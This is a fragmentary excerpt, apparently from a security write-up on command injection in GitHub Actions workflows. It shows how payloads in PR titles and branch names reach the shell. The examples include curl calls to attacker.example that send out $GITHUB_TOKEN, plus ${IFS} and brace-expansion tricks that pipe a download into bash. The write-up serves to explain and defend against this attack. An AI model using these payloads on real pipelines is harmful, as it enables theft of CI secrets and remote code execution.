...
```
"; curl https://attacker.example/$(cat $GITHUB_TOKEN) #
```

After expression substitution, the shell sees:
```bash
echo "PR Title: "; curl https://attacker.example/$(cat $GITHUB_TOKEN) #"
```
...
**Attack branch name:**
```
dev$({curl,-sSfL,attacker.example/steal}${IFS}|${IFS}bash)
```

Breakdown:
- `${IFS}` — Internal Field Separator, becomes a space
- `$({curl,-sSfL,attacker.example/steal})` — brace expansion + command substitution
...
The base64 decodes to `curl -sSfL attacker.example/steal`, executed via command substitution in the filename.
...
**Payload in PR title:**
```
$(curl -sSfL attacker.example/steal | bash)
```
